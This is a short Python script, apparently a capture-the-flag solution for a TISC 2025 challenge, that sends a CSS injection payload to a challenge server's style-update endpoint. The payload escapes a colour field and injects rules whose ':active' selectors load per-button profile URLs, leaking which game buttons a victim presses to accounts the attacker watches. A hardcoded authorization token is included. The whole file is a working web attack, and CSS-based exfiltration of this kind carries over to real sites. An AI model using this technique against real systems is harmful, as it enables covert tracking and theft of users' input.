# Sends CSS injection payload

import requests
import json

url = "http://chals.tisc25.ctf.sg:23196/api/update_style"
headers = {
    "Authorization": "05fe637bf06f331ba5088b1c1a7d2763db072dce875f018a05bdfd49d7fa3cdba4682859c9fab7fc8ad6"
}

accounts = json.load(open("accounts.json", "r"))
usernames = {id: val["username"] for id, val in accounts.items()}

payload = f"""
#ed333b;}}
.source-cards > :nth-child(1 of button.number-card:not([class*="chars"])):active {{ 
    content: url("/api/profile/{usernames["l1"]}?a=1");
}}
.source-cards > :nth-child(2 of button.number-card:not([class*="chars"])):active {{ 
    content: url("/api/profile/{usernames["l1"]}?a=2");
}}
.source-cards > :nth-child(3 of button.number-card:not([class*="chars"])):active {{ 
    content: url("/api/profile/{usernames["l1"]}?a=3");
}}
.source-cards > :nth-child(1 of button.number-card--2-chars):active {{ 
    content: url("/api/profile/{usernames["l2"]}?a=1");
}}
.source-cards > :nth-child(2 of button.number-card--2-chars):active {{ 
    content: url("/api/profile/{usernames["l2"]}?a=2");
}}
.source-cards > .number-card--3-chars:active {{ 
    content: url("/api/profile/{usernames["l3"]}");
}}
.source-cards > .number-card--4-chars:active {{ 
    content: url("/api/profile/{usernames["l4"]}");
}}

.operators :nth-child(1):active {{
    content: url("/api/profile/{usernames["+"]}");
}}
.operators :nth-child(2):active {{
    content: url("/api/profile/{usernames["-"]}");
}}
.operators :nth-child(3):active {{
    content: url("/api/profile/{usernames["*"]}");
}}
.operators :nth-child(4):active {{
    content: url("/api/profile/{usernames["/"]}");
}}

.board > div:nth-child(3) > .operation:nth-child(1) > :nth-child(5):active {{
    content: url("/api/profile/{usernames["r1"]}");
}}
.board > div:nth-child(3) > .operation:nth-child(2) > :nth-child(5):active {{
    content: url("/api/profile/{usernames["r2"]}");
}}
.board > div:nth-child(3) > .operation:nth-child(3) > :nth-child(5):active {{
    content: url("/api/profile/{usernames["r3"]}");
}}
.board > div:nth-child(3) > .operation:nth-child(4) > :nth-child(5):active {{
    content: url("/api/profile/{usernames["r4"]}");
}}
.board > div:nth-child(3) > .operation:nth-child(5) > :nth-child(5):active {{
    content: url("/api/profile/{usernames["r5"]}");
}}
"""
files = {
    "style_color": (None, payload)
    
}

response = requests.post(url, headers=headers, files=files)
print(response.status_code)
print(response.text)
